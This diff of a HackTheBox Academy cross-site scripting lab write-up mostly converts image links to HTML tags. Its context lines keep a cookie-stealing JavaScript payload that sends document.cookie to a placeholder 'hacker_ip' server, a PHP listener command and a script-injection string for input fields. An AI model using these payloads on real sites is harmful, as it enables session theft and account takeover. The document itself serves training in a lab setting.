@@ -20,10 +20,9 @@ First, let's create a server on our machine and prepare a payload for testing in
 ```nano myscript.js > new Image().src='http://hacker_ip:3333/index.php?c='+document.cookie;```
 
 ```nano index.php```
+>
 
-[tmpserver](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/tmpserver.png)
-
-[php-code](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/HTB-CROSS_SITE-SCRIPTING-XSS-.png)
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/HTB-CROSS_SITE-SCRIPTING-XSS-.png" >
 Let's start your server
 
 ```sudo php -S 0.0.0.0:3333```
@@ -32,15 +31,14 @@ Now let's test the input fields on the target site:
 
 ```"><script src=http://hacker_ip:3333/myscript.js></script>```
 
-[start server](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png)
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png" >
 
-[inputs](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png)
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png" >
 
 Great, it works!
 
 Let's check our cookie file.
-
-[cat cookies](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png)
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png" >
 
 Happy Hacking!
 
